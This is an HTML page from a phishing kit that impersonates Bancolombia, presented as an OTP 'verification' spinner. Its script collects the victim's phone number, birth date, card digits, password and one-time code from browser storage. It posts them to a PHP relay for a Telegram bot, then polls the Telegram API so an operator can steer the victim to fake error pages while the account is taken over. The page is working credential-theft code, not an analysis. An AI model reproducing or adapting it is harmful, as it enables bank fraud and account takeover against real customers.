<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificando OTP</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%; width: 100%;
      font-family: sans-serif;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .blur-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(255,255,255,0.4);
      backdrop-filter: blur(10px);
    }
    .loaderp-full {
      position: fixed; width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      z-index: 9999;
    }
    .loaderp {
      width: 180px; height: 180px;
      background-image: url('img/circulo.png');
      background-size: cover;
      border-radius: 50%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .loader {
      width: 30px; height: 30px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #333;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loaderp-text {
      margin-top: 30px;
      font-size: 14px;
      color: #000;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Verificando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async () => {
  const cfg = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
  if (!cfg) {
    alert("Error cargando configuración.");
    return;
  }

  const { token, chat_id } = cfg;
  const session = JSON.parse(localStorage.getItem("bancoldata") || "{}");
  const otp = localStorage.getItem("bancoldina");

  if (!session || !otp || !session.celular || !session.clave) {
    alert("Faltan datos. Redirigiendo...");
    return window.location.href = "index.html";
  }

  const transactionId = localStorage.getItem("transactionId") || (Date.now().toString(36) + Math.random().toString(36).slice(2));
  localStorage.setItem("transactionId", transactionId);

  const mensaje = `
<b>INGRESO BANCOLOMBIA (Dinámica)</b>
🆔 ID: <code>${transactionId}</code>
📱 Celular: ${session.celular}
🎂 Nacimiento: ${session.nacimiento}
💳 Tipo: ${session.tipo}
🔢 Identificador: ${session.identificador}
🔸 Últimos 2 dígitos: ${session.digitosFinales}
🔐 Clave: ${session.clave}
🔄 Dinámica OTP: ${otp}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "✅ Confirmar", callback_data: `confirm_finalizar:${transactionId}` }],
      [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "🔁 Error OTP", callback_data: `error_otp:${transactionId}` }],
      [{ text: "🏁 Finalizar", callback_data: `finalizar:${transactionId}` }]
    ]
  };

  await fetch("botmaster2.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
  });

  checkBoton(transactionId, token);
});

async function checkBoton(txId, botToken) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await res.json();

    const update = data.result.find(u =>
      u.callback_query &&
      u.callback_query.data &&
      u.callback_query.data.includes(txId)
    );

    if (update) {
      const tipo = update.callback_query.data.split(":")[0];

      switch (tipo) {
        case "error_logo":
          return window.location.href = "errorlogo.html";
        case "error_otp":
          return window.location.href = "cel-dina-error.html";
        case "finalizar":
          return window.location.href = "https://www.bancoppel.com";
        case "confirm_finalizar":
          // Solo envia notificación, pero no redirige automáticamente
          await fetch("sendStatus.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ status: "Finalización OTP Exitosa" })
          });
          return; // NO REDIRECCIONA
      }
    }

    setTimeout(() => checkBoton(txId, botToken), 2500);
  } catch (e) {
    console.error("Error verificando botón:", e);
    setTimeout(() => checkBoton(txId, botToken), 3000);
  }
}
</script>

</body>
</html>
